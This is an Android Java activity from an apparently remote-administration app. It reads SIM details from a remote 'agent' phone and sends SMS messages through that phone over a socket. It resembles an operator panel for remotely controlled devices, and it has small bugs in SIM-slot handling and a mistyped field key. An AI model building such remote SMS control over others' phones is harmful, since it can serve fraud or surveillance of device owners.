package com.pegalite.neotronadmin.ui;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import com.pegalite.alerts.dialog.PegaSuccessDialog;
import com.pegalite.alerts.utils.DialogData;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.databinding.ActivitySendMessageBinding;
import com.pegalite.neotronadmin.functions.alerts.SendingDialog;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Objects;

import io.socket.client.Ack;

public class SendMessageActivity extends PegaAppCompatActivity {

    ActivitySendMessageBinding binding;
    int slotIndex = 0;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySendMessageBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        String agentID = getIntent().getStringExtra("agentID");
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.send.setOnClickListener(v -> {
            String number = binding.number.getText().toString();
            String message = binding.message.getText().toString();

            if (number.isBlank()) {
                PegaAnimationManager.shake(binding.number);
                Toast.makeText(this, "Enter An Valid Number", Toast.LENGTH_SHORT).show();
                return;
            }
            if (message.isBlank()) {
                PegaAnimationManager.shake(binding.message);
                Toast.makeText(this, "Enter An Valid Message", Toast.LENGTH_SHORT).show();
                return;
            }

            sendMessage(agentID, number, message);

        });

        binding.sim1.setOnClickListener(v -> {
            if (slotIndex == 0) {
                return;
            }

            slotIndex++;
            binding.sim1.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim2.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

        binding.sim2.setOnClickListener(v -> {
            if (slotIndex == 1) {
                return;
            }

            slotIndex--;
            binding.sim2.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim1.setBackgroundDrawable(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

        PegaSocketServer.getSocket().emit("get_sim_status", agentID, (Ack) args -> {
            runOnUiThread(() -> {
                JSONObject data = (JSONObject) args[0];
                binding.progress.setVisibility(GONE);
                if (data.optString("status").equals("success")) {
                    setSimDetails(Objects.requireNonNull(data.optJSONArray("data")));
                    binding.detailsContainer.setVisibility(VISIBLE);
                } else {
                    binding.simDetailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });
    }

    private void setSimDetails(JSONArray data) {
        if (data.length() == 0) {
            return;
        }

        JSONObject sim1Info = data.optJSONObject(0);
        binding.number1.setText(sim1Info.optString("number"));
        binding.carrierName1.setText(sim1Info.optString("carrierName"));
        binding.displayName1.setText(sim1Info.optString("displayName"));
        binding.sim1.setVisibility(VISIBLE);

        JSONObject sim2Info = data.optJSONObject(1);
        if (data.length() > 1) {
            binding.number2.setText(sim2Info.optString("number"));
            binding.carrierName2.setText(sim2Info.optString("carrierName:"));
            binding.displayName2.setText(sim2Info.optString("displayName"));
            binding.sim2.setVisibility(VISIBLE);
        }
    }

    private void sendMessage(String agentID, String number, String message) {
        SendingDialog sendingDialog = new SendingDialog(getActivity(), DialogData.UN_CANCELABLE);
        sendingDialog.show("Sending Message...");
        addDialogToDestroyList(sendingDialog);
        PegaSocketServer.getSocket().emit("send-sms", agentID, number, message, slotIndex, (Ack) args -> runOnUiThread(() -> {
            sendingDialog.dismiss();
            JSONObject data = (JSONObject) args[0];
            if (data.optString("status").equals("success")) {
                PegaSuccessDialog successDialog = new PegaSuccessDialog(getActivity(), DialogData.DISMISS_ON_CANCEL);
                successDialog.show("Message Successfully Sent!");
                addDialogToDestroyList(sendingDialog);
            } else {
                binding.simDetailsContainer.setVisibility(GONE);
                binding.detailsContainer.setVisibility(GONE);
                binding.errorMessage.setVisibility(VISIBLE);
                binding.errorMessage.setText(data.optString("msg"));
            }
        }));
    }
}